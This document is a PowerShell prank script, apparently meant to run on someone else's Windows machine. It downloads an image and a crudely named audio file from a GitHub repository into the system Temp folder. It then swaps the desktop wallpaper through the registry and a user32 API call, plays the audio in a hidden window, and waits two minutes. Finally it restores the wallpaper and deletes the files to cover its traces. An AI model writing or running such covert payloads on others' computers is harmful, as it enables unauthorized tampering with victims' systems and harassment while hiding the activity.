# Enable TLSv1.2 for compatibility with older clients
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12

$urls = @(                                                                                                 
      "https://raw.githubusercontent.com/M3ntallyOk/fasjopasfhb/main/Yakuza_nishikiyama_bust.jpg",
      "https://github.com/M3ntallyOk/fasjopasfhb/raw/main/Pussy.wav"
  )

$webClient = New-Object System.Net.WebClient

foreach ($i in 0..($urls.Count - 1)) {
    $url = $urls[$i]
    $filename = Split-Path $url -Leaf
    $path = if ($i -eq 0) { "$env:SystemRoot\Temp\$filename" } else { "$env:SystemRoot\Temp\$filename" }
    $webClient.DownloadFile($url, $path)
}

$currentWallpaper = Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper | Select-Object -ExpandProperty Wallpaper
$audio_path = "$env:SystemRoot\Temp\$($urls[1] | Split-Path -Leaf)"
Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value "C:\Windows\Temp\Yakuza_nishikiyama_bust.jpg"

$signature = @"
[DllImport("user32.dll", SetLastError = true)]
public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);
"@
$SPI_SETDESKWALLPAPER = 20
$SPIF_UPDATEINIFILE = 1
$SPIF_SENDWININICHANGE = 2
$null = Add-Type -MemberDefinition $signature -Name WinAPI -Namespace Wallpaper
[Wallpaper.WinAPI]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, [IntPtr]::Zero, $SPIF_UPDATEINIFILE -bor $SPIF_SENDWININICHANGE)

Start-Process powershell.exe -ArgumentList "-c (New-Object Media.SoundPlayer '$audio_path').PlaySync();" -WindowStyle Hidden
Start-Sleep -Seconds 120  # Wait for 2 minutes

Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value $currentWallpaper
[Wallpaper.WinAPI]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, [IntPtr]::Zero, $SPIF_UPDATEINIFILE -bor $SPIF_SENDWININICHANGE)
Remove-Item "$env:SystemRoot\Temp\Yakuza_nishikiyama_bust.jpg", "$env:SystemRoot\Temp\Pussy.wav" -Force #remove the files
exit
